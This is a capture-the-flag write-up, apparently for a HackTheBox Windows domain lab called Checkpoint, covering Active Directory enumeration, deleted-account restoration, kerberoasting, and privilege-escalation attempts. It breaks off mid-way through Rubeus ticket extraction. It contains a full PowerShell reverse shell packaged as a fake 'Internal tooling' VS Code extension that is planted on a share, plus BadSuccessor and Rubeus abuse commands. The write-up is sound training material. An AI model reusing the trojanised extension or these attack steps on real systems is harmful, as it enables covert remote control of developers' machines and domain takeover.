**MEDIUM** · **WINDOWS**
### DAY 1
The machine starts with initial credentials

>[!info]
>As is common in real life pentests, you will start the Checkpoint box with credentials for the following account alex.turner / Checkpoint2024!

Port Scan
```shell
sudo nmap -Pn -sCV -p- --min-rate 4000 -T 4 -oN checkpoint-ports.txt 10.129.111.174
[sudo] password for darklight:
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 07:22 +0300
Nmap scan report for 10.129.111.174
Host is up (0.41s latency).
Not shown: 65531 filtered tcp ports (no-response)
PORT    STATE SERVICE    VERSION
53/tcp  open  tcpwrapped
135/tcp open  tcpwrapped
139/tcp open  tcpwrapped
445/tcp open  tcpwrapped

Host script results:
| smb2-time:
|   date: 2026-09-09T11:23:40
|_  start_date: N/A
| smb2-security-mode:
|   3.1.1:
|_    Message signing enabled and required
|_clock-skew: 6h59m58s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 83.01 seconds
```

We get some info,  first we got a clock-skew to resolve , how to do it check out this [[Resolving clock_skew error]]. Second we notice we have SMB service running on the system, but message signing is enabled, so relay attacks will fail. Our next step is to test the provided credentials.

```shell
nxc smb 10.129.111.174 -u 'alex.turner' -p 'Checkpoint2024!'
SMB         10.129.111.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.111.174  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

The credentials are valid. Lets enumerate SMB shares.

```shell
nxc smb 10.129.111.174 -u 'alex.turner' -p 'Checkpoint2024!' --shares
SMB         10.129.111.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.111.174  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
SMB         10.129.111.174  445    DC01             [*] Enumerated shares
SMB         10.129.111.174  445    DC01             Share           Permissions     Remark
SMB         10.129.111.174  445    DC01             -----           -----------     ------
SMB         10.129.111.174  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.111.174  445    DC01             C$                              Default share
SMB         10.129.111.174  445    DC01             DevDrop         READ            VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.111.174  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.111.174  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.111.174  445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.111.174  445    DC01             VMBackups
```

The `DevDrop` share is empty 

```shell
smbclient //10.129.111.174/DevDrop -U 'checkpoint.htb/alex.turner'
Password for [CHECKPOINT.HTB\alex.turner]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed May 27 00:45:01 2026
  ..                                  D        0  Sat May  9 17:42:27 2026

		10459391 blocks of size 4096. 2466898 blocks available
smb: \>
```

I will jump to active directory enumeration and see what we can get.
Running `rusthound-ce` i run into an LDAP error 

```shell
rusthound-ce -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb -n 10.129.111.174 -f DC01.checkpoint.htb --zip
---------------------------------------------------
Initializing RustHound-CE at 08:10:37 on 09/09/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-09T05:10:37Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-09T05:10:37Z INFO  rusthound_ce] Collection method: All
[2026-09-09T05:10:39Z ERROR rusthound_ce::ldap] Failed to authenticate to CHECKPOINT.HTB Active Directory. Reason: LDAP operation result: rc=8 (strongerAuthRequired), dn: "", text: "00002028: LdapErr: DSID-0C09035C, comment: The server requires binds to turn on integrity checking if SSL\TLS are not already active on the connection, data 0, v65f4"
```

Looking closely at the error, we can see `rc=8 (strongerAuthRequired)`. This indicates that the LDAP server rejected the authentication attempt because it was an unprotected bind and the server requires integrity protection.

This strongly suggests that LDAP signing is enforced on the domain controller. We can confirm this by checking the LDAP configuration with NetExec:

```shell
nxc ldap 10.129.111.174 -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb
[*] Initializing LDAP protocol database
LDAP        10.129.111.174  389    DC01             [*] Windows 11 / Server 2025 Build 26100 (name:DC01) (domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
LDAP        10.129.111.174  389    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

The output shows:
```text
(domain:checkpoint.htb) (signing:Enforced) (channel binding:No TLS cert)
```

The `signing:Enforced` value confirms that **LDAP signing is enforced** on the domain controller. The `channel binding:No TLS cert` value indicates that the LDAP service on port 389 does not have a TLS certificate available for channel binding in this configuration.

We could try LDAPS by adding the flag `--ldaps`, which uses LDAP over TLS and normally runs on port 636, but our port scan did not show 636 open on the host.Since we performed an aggressive scan, i will use `nc` to verify the port is actually closed.

```shell
nc -zv 10.129.111.174 636
DC01.checkpoint.htb [10.129.111.174] 636 (ldaps) open
```
The port is actually open. I will rerun `nmap` will less aggressive flags to identify what other ports we might have missed. 

```nmap
sudo nmap -Pn -p- --min-rate 1000 10.129.111.174
[SNIP]
Not shown: 65516 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49664/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49681/tcp open  unknown
49682/tcp open  unknown
49691/tcp open  unknown
49721/tcp open  unknown
```
We actually missed some ports earlier.
Running `rusthound-ce` with `--ldaps` flag.
```shell
rusthound-ce -u 'alex.turner' -p 'Checkpoint2024!' -d checkpoint.htb -n 10.129.111.174 -f DC01.checkpoint.htb --ldaps --zip
---------------------------------------------------
Initializing RustHound-CE at 09:35:14 on 09/09/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-09T06:35:14Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-09T06:35:14Z INFO  rusthound_ce] Collection method: All
Error: Io { source: Os { code: 104, kind: ConnectionReset, message: "Connection reset by peer" } }
```

We are running into another error, `Connection reset by peer`.  This explicitly indicates that the TLS Handshake is failing. What's happening
- My machine successfully opened a **TCP connection** to port 636.
- The client started the **TLS handshake** (sent a ClientHello).
- The Domain Controller immediately aborted the connection by sending a **TCP RST** packet.

On Windows Domain Controllers, LDAPS is provided through the Windows Schannel TLS implementation. A `Connection reset by peer` from RustHound-CE indicates that the connection is being terminated by the remote side, but the error alone does not identify the exact cause. Some possible causes include:

| Cause                             | What could happen                                                                                                                                                                                  |
| --------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| **Certificate problem**           | The DC may not have a suitable LDAPS certificate, or the certificate may have an incorrect CN/SAN, missing Server Authentication EKU, an unavailable private key, or an invalid certificate chain. |
| **TLS version / cipher mismatch** | The client and Schannel may fail to agree on a compatible TLS protocol or cipher suite, preventing the TLS handshake from completing.                                                              |
We can use nmap or openssl to investigate more.

Running nmap with ssl scripts:
```shell
nmap -Pn -sV -p 636 --script ssl-cert,ssl-enum-ciphers 10.129.111.174
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-09 09:42 +0300
Nmap scan report for DC01.checkpoint.htb (10.129.111.174)
Host is up (0.37s latency).

PORT    STATE SERVICE    VERSION
636/tcp open  tcpwrapped

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 22.81 seconds
```

We get no information on the certificate.

Running openssl:

```shell
openssl s_client -connect 10.129.111.174:636 -servername DC01.checkpoint.htb </dev/null
Connecting to 10.129.111.174
CONNECTED(00000003)
write:errno=104
---
no peer certificate available
---
No client certificate CA names sent
Negotiated TLS1.3 group: <NULL>
---
SSL handshake has read 0 bytes and written 1686 bytes
Verification: OK
---
New, (NONE), Cipher is (NONE)
Protocol: TLSv1.3
This TLS version forbids renegotiation.
Compression: NONE
Expansion: NONE
No ALPN negotiated
Early data was not sent
Verify return code: 0 (ok)
---
40B7646C9D7F0000:error:0A000197:SSL routines:SSL_shutdown:shutdown while in init:../ssl/ssl_lib.c:2804:
```

The important part is:

```
no peer certificate available
SSL handshake has read 0 bytes...
```

The server did not send a TLS response or present a certificate to the client. This means the failure is occurring **before certificate verification and before LDAP authentication takes place**. Therefore, although port 636 is open, the LDAPS service is **not successfully completing the TLS handshake**. This could indicate a problem with the Domain Controller's Schannel/TLS configuration or the certificate configuration required for LDAPS.

Since LDAPS is not functioning correctly, another option is to use **Kerberos-backed LDAP authentication**. Kerberos can provide the required integrity protection through SASL/GSSAPI. Before using Kerberos, we need to configure the Kerberos client and obtain a Kerberos ticket for the domain.

```shell
nxc smb 10.129.111.174 -u 'alex.turner' -p 'Checkpoint2024!' --generate-krb5-file checkpoint.krb5
SMB         10.129.111.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.111.174  445    DC01             [+] krb5 conf saved to: checkpoint.krb5
SMB         10.129.111.174  445    DC01             [+] Run the following command to use the conf file: export KRB5_CONFIG=checkpoint.krb5
SMB         10.129.111.174  445    DC01             [+] checkpoint.htb\alex.turner:Checkpoint2024!
```

You can export it as suggested or copy it to `/etc/krb5`. Then we request for a certificate

```shell
faketime -f '+7hrs' \
impacket-getTGT checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.111.174
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in alex.turner.ccache

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ export KRB5CCNAME=alex.turner.ccache
```

Finally run `rusthound-ce` with `-k` flag to enable kerberos authentication. 

```shell
faketime -f '+7hrs' \
> rusthound-ce -u 'alex.turner@checkpoint.htb' -p 'Checkpoint2024!' -k -d checkpoint.htb -n 10.129.111.174 -f DC01.checkpoint.htb --zip
---------------------------------------------------
Initializing RustHound-CE at 15:30:03 on 09/09/26
Powered by @g0h4n_0
---------------------------------------------------

[2026-09-09T12:30:03Z INFO  rusthound_ce] Verbosity level: Info
[2026-09-09T12:30:03Z INFO  rusthound_ce] Collection method: All
[2026-09-09T12:30:11Z INFO  rusthound_ce::ldap] Connected to CHECKPOINT.HTB Active Directory!
[2026-09-09T12:30:11Z INFO  rusthound_ce::ldap] Starting data collection...
[2026-09-09T12:30:12Z INFO  rusthound_ce::ldap] Ldap filter : (objectClass=*)

[SNIP]
```

Lets start bloodound and analyze the data.

```shell
bloodhound-start
[sudo] password for darklight:
Starting neo4j
Neo4j is not running.
Directories in use:
home:         /usr/share/neo4j

[SNIP]
```

Our current user, `alex.turner`, is a member of 7 groups, but bloodhound shows no interesting rights.

![[Pasted image 20260909103135.png]]

The `IT-Staff` group has three users, but from bloodhound there are no any rights  visible.

![[Pasted image 20260909104012.png]]

`VPN-Users` group has four users.
![[Pasted image 20260909104154.png]]

`ryan.brooks` has `GenericWrite` rights over `SVC_Deploy`
![[Pasted image 20260909104256.png]]

`SVC_Deploy` is a member of 7 groups but we have two most interesting ones.

![[Pasted image 20260909104640.png]]

`SVC_Depoly` is an interesting account since with it we can establish a remote connection with the host (Remote Management Group) and also we have access to potentially sensitive backed up files, (BackupAccess Group), actually earlier we identified a `VMbackup`  share, so the user might have access to that share. This makes `SVC_Deploy` our first target account.

There are no other users in the two groups, therefore we have to compromise the account to use the privileges of the two groups, or find a way to add another account to those groups.

>[!question]
>How do we get to ryan.brooks ?

Further analysis using bloodhound gives nothing on how to get to `ryan.book` or `svc_deploy` from `alex.turner`

Am going to check if there password reuse among the users. 

![[Pasted image 20260909111345.png]]

No success on that. Nothing important on kerberoasting and AS_REP roasting either.

We can further enumerate ACLs using `bloodyad`

```shell
faketime -f '+7hrs' \
> bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k get writable --detail

distinguishedName: CN=Deleted Objects,DC=checkpoint,DC=htb
DACL: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: OU=Employees,DC=checkpoint,DC=htb
device: CREATE_CHILD
ipNetwork: CREATE_CHILD
organizationalUnit: CREATE_CHILD
intellimirrorGroup: CREATE_CHILD

[SNIP]
```

Findings: 
###### 1. `CN=Alex Turner` 

The ACL enumeration shows that we have `WRITE` access to a large number of attributes on Alex Turner's account, most of which are related to profile and contact information such as addresses, phone numbers, and the `info` attribute. These appear to be typical self-service profile permissions and do not provide an obvious path to privilege escalation on their own. Further more we already got access to this account so the account is of least interest but lets just check the interesting attributes: 

Two attributes are more interesting:
- **`userCertificate: WRITE`** — This allows us to modify the certificate stored on the account. However, writing a certificate value alone does not give us the corresponding private key required to authenticate as the user, so this does not immediately provide account takeover.
    
- **`msDS-AllowedToActOnBehalfOfOtherIdentity: WRITE`** — This attribute is associated with **Resource-Based Constrained Delegation (RBCD)** and can be abused to configure a principal that is allowed to impersonate users to a target service. However, the permission is present on Alex Turner's user object rather than a target computer account or service account, making this less immediately useful for an RBCD attack.

###### 2. `CN=Mark Davies` (Deleted) — The More Significant Finding

The deleted Mark Davies object is considerably more interesting. The permissions shown are effectively **GenericAll-like control over the object**, with `WRITE` access to a very large number of attributes, including several that can directly enable account takeover or privilege manipulation.

Notable attributes include:
- **`unicodePwd: WRITE`** — allows modification of the account's password when the object is restored.
- **`msDS-KeyCredentialLink: WRITE`** — provides a potential **Shadow Credentials** attack path, allowing an attacker to associate their own key material with the account and authenticate using PKINIT.
- **`servicePrincipalName: WRITE`** — allows an SPN to be added to the account, potentially creating an opportunity to obtain and crack a Kerberos service ticket.
- **`sIDHistory`, `adminCount`, `primaryGroupID`, `nTSecurityDescriptor`, and `objectSid`** — sensitive attributes that can potentially be leveraged for account or privilege manipulation.
- **`isDeleted: WRITE`** and **`lastKnownParent: WRITE`** — particularly interesting because they are associated with the state and previous location of a deleted Active Directory object.

###### 3. OU=Employees,DC=checkpoint,DC=htb 
-  `alex.turner` has **`CREATE_CHILD` permissions on the `Employees` OU for a huge number of object classes**, including:

```
user: CREATE_CHILD
computer: CREATE_CHILD
group: CREATE_CHILD
```

###### 4. **CN=Deleted Objects,DC=checkpoint,DC=htb**
- **DACL: WRITE** `alex.turner` can modify the DACL of the Deleted Objects container. This is often used to restore deleted objects.

The next step is to restore Mark Davies, then reset the password or drop a Shadow Credential on it and authenticate as that account.

Restoring the account :

```shell
faketime -f '+7hrs' \
bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k \
  set restore "CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb"
[+] CN=Mark Davies\0ADEL:2217e877-e2a2-47d7-91d4-99ede36f367e,CN=Deleted Objects,DC=checkpoint,DC=htb has been restored successfully under CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
```

Changing the password fails:

```shell
faketime -f '+7hrs' \
bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k set password "mark.davies" 'NewP@ssw0rd123!'
Traceback (most recent call last):
  File "/usr/bin/bloodyad", line 6, in <module>
    sys.exit(main())
             ~~~~^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 342, in main
    asyncio.run(amain())
    ~~~~~~~~~~~^^^^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 195, in run
    return runner.run(main)
           ~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/runners.py", line 118, in run
    return self._loop.run_until_complete(task)
           ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^
  File "/usr/lib/python3.13/asyncio/base_events.py", line 725, in run_until_complete
    return future.result()
           ~~~~~~~~~~~~~^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/main.py", line 272, in amain
    output = await result
             ^^^^^^^^^^^^
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 288, in password
    raise e
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/cli_modules/set.py", line 129, in password
    await ldap.bloodymodify(target, {"unicodePwd": op_list})
  File "/usr/share/bloodyad/lib/python3.13/site-packages/bloodyAD/network/ldap.py", line 336, in bloodymodify
    raise err
badldap.commons.exceptions.LDAPModifyException: Password can't be changed. It may be because the oldpass provided is not valid.
You can try to use another password change protocol such as smbpasswd, server error may be more explicit.
```

Adding shadow credentials using `certipy-ad`

```shell
certipy-ad shadow add -account 'mark.davies' -dc-ip 10.129.111.174 -dc-host DC01.checkpoint.htb -k
Certipy v5.0.4 - by Oliver Lyak (ly4k)

[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
[-] Got error: socket ssl wrapping error: [Errno 104] Connection reset by peer
[-] Use -debug to print a stacktrace
```

We get the same error as before, which indicates `certipy-ad` is using LDAPS

We could also add an SPN to the user then perform kerberoasting.
Adding SPN

```shell
faketime -f '+7hrs' \
bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k \
set object "mark.davies" servicePrincipalName -v 'HTTP/mark-davies.checkpoint.htb'
[+] mark.davies's servicePrincipalName has been updated
```

```shell
faketime -f "+7hrs" \
impacket-GetUserSPNs checkpoint.htb/alex.turner:'Checkpoint2024!' -dc-ip 10.129.111.174 -request
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

ServicePrincipalName             Name         MemberOf  PasswordLastSet             LastLogon  Delegation
-------------------------------  -----------  --------  --------------------------  ---------  ----------
HTTP/mark-davies.checkpoint.htb  mark.davies            2026-05-09 12:00:48.810501  <never>



$krb5tgs$18$mark.davies$CHECKPOINT.HTB$*checkpoint.htb/mark.davies*$9e44350d035390b3e5117e14$713afcb3b480217ee30ec75ce4570c9ac8e2c6d3716880ba2b7676ae15d5ec1d13ac7f2a93be9e08c0d85a1dbfd6052d0d37745fa650754dea7dab67bafbab7cef9b442b3daf2226f202771321c1dc23e35bf6d9c0b3c65dd77a0a4c3f89ce6418158dfe80d2cf2c0f0f8ff64c816e6cddb50acbe81a915423e5bd9689eebae1 [SNIP]
```

We get the TGS but it wont crack. Checking whether the account reuses `alex.tuner's` password.

```shell
nxc smb 10.129.111.174 -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb
SMB         10.129.111.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.111.174  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
```

And we got it, its a password reuse. Lets request for a ticket then we get the writable of the user.

```shell
└─$ faketime -f '+7hrs' \
impacket-getTGT checkpoint.htb/mark.davies:'Checkpoint2024!' -dc-ip 10.129.111.174
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in mark.davies.ccache

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ export KRB5CCNAME=mark.davies.ccache

┌──(darklight💀ataraxia)-[~/Documents/CTF/HTB/checkpoint]
└─$ faketime -f '+7hrs' \
> bloodyad -d checkpoint.htb --host DC01.checkpoint.htb -k get writable --detail

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=checkpoint,DC=htb
url: WRITE
wWWHomePage: WRITE

distinguishedName: CN=Mark Davies,OU=Employees,DC=checkpoint,DC=htb
thumbnailPhoto: WRITE
pager: WRITE
mobile: WRITE
homePhone: WRITE
userSMIMECertificate: WRITE
msDS-ExternalDirectoryObjectId: WRITE
[SNIP]
```

No interesting rights, just Write rights on self-attributes only.
Next step is to check rights on shares.

```shell
nxc smb 10.129.111.174 -u mark.davies -p 'Checkpoint2024!' -d checkpoint.htb --shares
SMB         10.129.111.174  445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         10.129.111.174  445    DC01             [+] checkpoint.htb\mark.davies:Checkpoint2024!
SMB         10.129.111.174  445    DC01             [*] Enumerated shares
SMB         10.129.111.174  445    DC01             Share           Permissions     Remark
SMB         10.129.111.174  445    DC01             -----           -----------     ------
SMB         10.129.111.174  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.111.174  445    DC01             C$                              Default share
SMB         10.129.111.174  445    DC01             DevDrop         READ,WRITE      VS Code extensions share for approved .vsix packages compatible with VS Code engine 1.118.0
SMB         10.129.111.174  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.111.174  445    DC01             NETLOGON        READ            Logon server share
SMB         10.129.111.174  445    DC01             SYSVOL          READ            Logon server share
SMB         10.129.111.174  445    DC01             VMBackups
```

Now we have Write rights on `DevDrop` share. Now that we have additional rights lets take a closer look to this share and get an understanding of what .vsix packages are , https://vsix.guide/.\

### DAY 2

Further research i realized that we could actually use Metasploit framework to generate a malicious .vsix file that if installed will lead to a reverse shell connection.  https://github.com/rapid7/metasploit-framework/pull/18996

Using Metasploit we were able to create the file and also set up a listener.

![[Pasted image 20260910093425.png]]

Since `mark.davies` has write permissions on the `DevDrop` share, the next step is to upload the .vsix file we created using Metasploit and hope somebody installs it , if everything is all good, we should get a connection on our listener when they do install.

![[Pasted image 20260910094315.png]]

Time to swing on the chair... 

Okay... after waiting for about 15 minutes we got nothing.. I wasn't sure whether its our payload or our extension was never installed. 

decided to use another approach 

First we set up the folder

```shell
mkdir -p vsix-payload/extension/out
cd vsix-payload
```

Next create `extension/package.json`

```shell
cat > extension/package.json << 'EOF'
{
  "name": "checkpoint-tools",
  "displayName": "Checkpoint Tools",
  "description": "Internal tooling",
  "version": "1.0.0",
  "engines": { "vscode": "^1.118.0" },
  "activationEvents": ["*"],
  "main": "./out/extension.js",
  "contributes": {}
}
EOF
```

create the payload `extension/out/extension.js`

```shell
LHOST=10.10.X.X  # your tun0 IP
LPORT=4444

cat > extension/out/extension.js << EOF
const { exec } = require('child_process');

function activate(context) {
    const cmd = "powershell -w hidden -c \"\$c=New-Object Net.Sockets.TCPClient('${LHOST}',${LPORT});\$s=\$c.GetStream();[byte[]]\$b=0..65535|%{0};while((\$i=\$s.Read(\$b,0,\$b.Length))-ne 0){;\$d=(New-Object Text.ASCIIEncoding).GetString(\$b,0,\$i);\$r=(iex \$d 2>&1|Out-String);\$rb=([text.encoding]::ASCII).GetBytes(\$r);\$s.Write(\$rb,0,\$rb.Length);\$s.Flush()};\$c.Close()\"";
    exec(cmd);
}

function deactivate() {}

module.exports = { activate, deactivate };
EOF
```

create `extension.vsixmanifest`
```shell
cat > extension.vsixmanifest << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<PackageManifest Version="2.0.0" xmlns="http://schemas.microsoft.com/developer/vsx-schema/2011">
  <Metadata>
    <Identity Language="en-US" Id="checkpoint-tools" Version="1.0.0" Publisher="checkpoint"/>
    <DisplayName>Checkpoint Tools</DisplayName>
    <Description>Internal tooling</Description>
  </Metadata>
  <Installation>
    <InstallationTarget Id="Microsoft.VisualStudio.Code"/>
  </Installation>
  <Assets>
    <Asset Type="Microsoft.VisualStudio.Code.Manifest" Path="extension/package.json" Addressable="true"/>
  </Assets>
</PackageManifest>
EOF
```

create `[Content_Types].xml`

```shell
cat > '[Content_Types].xml' << 'EOF'
<?xml version="1.0" encoding="utf-8"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension=".json" ContentType="application/json"/>
  <Default Extension=".js" ContentType="application/javascript"/>
  <Default Extension=".vsixmanifest" ContentType="text/xml"/>
</Types>
EOF
```

zip it into a `.vsix`

```shell
zip -r ../checkpoint-tools.vsix '[Content_Types].xml' extension.vsixmanifest extension/
```

Next we start our listener.

```shell
nc -lvnp 4444
```

Lets upload the new payload

```shell
smbclient //10.129.112.147/DevDrop -U 'checkpoint.htb/mark.davies'
Password for [CHECKPOINT.HTB\mark.davies]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Sep 10 16:33:15 2026
  ..                                  D        0  Sat May  9 17:42:27 2026
  rev.vsix                            A     1668  Thu Sep 10 16:33:15 2026

		10459391 blocks of size 4096. 2486834 blocks available
smb: \> rm rev.vsix
smb: \> put checkpoint-tools.vsix
putting file checkpoint-tools.vsix as \checkpoint-tools.vsix (1.1 kB/s) (average 1.1 kB/s)
smb: \>
```

And we get a connection on our listener.

```shell
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.10.16.46] from (UNKNOWN) [10.129.112.147] 62776

whoami
checkpoint\ryan.brooks
```

From our AD analysis we know that `ryan.brooks` has `GenericWrite` rights over `SVC_Deploy`. 

### DAY 3

Hunting for stored credentials and tickets

![[Pasted image 20260911080723.png]]

Lets enumerate ACLs for ryan and see what other interesting things he has. AM going to use `powerview`. First copy it to the current working directory.

```shell
cp /usr/share/powershell-empire/empire/server/data/module_source/situational_awareness/network/powerview.ps1 .
```

Then start a simple server using `python3`

```shell
python3 -m http.server
```

Then with the reverse shell, we download the file.

```powershell
IWR 'http://10.10.16.46:8000/powerview.ps1' -o powerview.ps1
```

The load the script.

```powershell
. .\powerview.ps1
```

Next we enumerate interesting ACLs

```powershell
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match "ryan" } | Select-Object ObjectDN, ActiveDirectoryRights,IdentityReferenceName | Format-List

ObjectDN              : OU=DMSAHolder,DC=checkpoint,DC=htb
ActiveDirectoryRights : CreateChild
IdentityReferenceName : ryan.brooks

ObjectDN              : CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb
ActiveDirectoryRights : GenericWrite
IdentityReferenceName : ryan.brooks
```

We have `CreateChild` rights on `DMSAHolder` OU and also we have `GenericWrite` rights on `svc_deploy` as discovered earlier. With the `GenericWrite` rights we have a bunch of options but most require us to have the credentials for `ryan.brooks`, or we could add an `SPN` to `svc_deploy` then request for a ticket and attempt to crack it. But from the rights we have a more straight forward, [badSuccessor](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)

First let's create the dMSA object,

```powershell
New-ADServiceAccount -Name "evilDMSA" -DNSHostName "evildmsa.checkpoint.htb" -Path "OU=DMSAHolder,DC=checkpoint,DC=htb" -Enabled $true
```

Verify its created

```powershell
Get-ADServiceAccount -Identity "evilDMSA" 

DistinguishedName : CN=evilDMSA,OU=DMSAHolder,DC=checkpoint,DC=htb
Enabled           : True
Name              : evilDMSA
ObjectClass       : msDS-GroupManagedServiceAccount
ObjectGUID        : c89d7c71-d658-4f61-b966-9f154b0238b6
SamAccountName    : evilDMSA$
SID               : S-1-5-21-3129162710-3498938529-1807524340-7101
UserPrincipalName :
```

From akamai's write-up we can target any account in the domain, lets try to target the `Administrator`. 

Lets set the target:

```powershell
$target = (Get-ADUser -Identity "Administrator").DistinguishedName
```

Next we modify the dMSA object's attributes, `msDS-ManagedAccountPrecededByLink` to point to the account we want to inherit it's privileges and `msDS-DelegatedMSAState` to define the state of the migration with `2` meaning the migration is compete.

```powershell
Set-ADServiceAccount -Identity "evilDMSA" -Replace @{'msDS-ManagedAccountPrecededByLink' = $target 'msDS-DelegatedMSAState' = 2 }
```

Let's verify that the attribute are adjusted accordingly,

```powershell
Get-ADServiceAccount -Identity "evilDMSA" -Properties msDS-ManagedAccountPrecededByLink, msDS-DelegatedMSAState | Select-Object Name, 'msDS-ManagedAccountPrecededByLink', 'msDS-DelegatedMSAState'

Name     msDS-ManagedAccountPrecededByLink msDS-DelegatedMSAState
----     --------------------------------- ----------------------
evilDMSA
```

Wait, seems like we might not have permissions to modify the attributes ....
Even after granting Ryan `GenericAll` over the newly created dMSA object, manually setting `msDS-ManagedAccountPrecededByLink` and `msDS-DelegatedMSAState` did not populate the attributes. Therefore, the failure was not explained by insufficient permissions on the dMSA object itself. Let's try a different approach, but first we need `Ryan's` credentials. 

Let's use Rubeus to hunt for tickets.

```powershell
.\Rubeus.exe triage

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


Action: Triage Kerberos Tickets (Current User)

[*] Current LUID    : 0x6fec7

 ---------------------------------------
 | LUID | UserName | Service | EndTime |
 ---------------------------------------
 ---------------------------------------
```

We get no tickets 

```powershell
.\Rubeus.exe tgtdeleg /nowrap

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.2.0


[*] Action: Request Fake Delegation TGT (current user)

[*] No target SPN specified, attempting to build 'cifs/dc.domain.com'
[*] Initializing Kerberos GSS-API w/ fake delegation for target 'cifs/DC01.checkpoint.htb'
[+] Kerberos GSS-API initialization success!
[+] Delegation requset success! AP-REQ delegation ticket is now in GSS-API output.
[*] Found the AP-REQ delegation ticket in the GSS-API output.
[*] Authenticator etype: aes256_cts_hmac_sha1
[*] Extracted the service ticket session key from the ticket cache: D2YvgiqDrCZknKmAOweFnLbItaCLvU2qprpUi+iEbyA=
[+] Successfully decrypted the authenticator
[*] base64(ticket.kirbi):

      doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwI
